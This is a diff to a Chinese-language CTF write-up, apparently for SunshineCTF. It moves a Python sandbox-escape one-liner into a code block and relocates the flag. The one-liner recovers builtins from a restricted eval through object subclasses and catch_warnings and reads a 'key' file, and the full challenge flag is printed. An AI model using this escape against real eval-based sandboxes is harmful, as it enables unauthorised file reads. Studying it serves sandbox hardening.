@@ -42,12 +42,20 @@ Halt in the name of the law!
 What was the ./key found in the previous challenge?
 ```
 
-`eval(client_input, {'__builtins__':{}})`,使用`[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ =="catch_warnings"][0]()._module.__builtins__['open']('key', 'r').read()`得到flag的第三部分`only_if_you_ast_whitelist_first}`
+`eval(client_input, {'__builtins__':{}})`,使用
+
+```python
+[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ =="catch_warnings"][0]()._module.__builtins__['open']('key', 'r').read()
+```
+
+得到flag的第三部分`only_if_you_ast_whitelist_first}`
+
+**flag:**`sun{eval_is_safe_only_if_you_ast_whitelist_first}`
+
+
 
 参考文章:
 
 * [safe eval](http://lybniz2.sourceforge.net/safeeval.html)
 * [python 沙箱逃逸与SSTI](https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/)
 
-
-**flag:**`sun{eval_is_safe_only_if_you_ast_whitelist_first}`
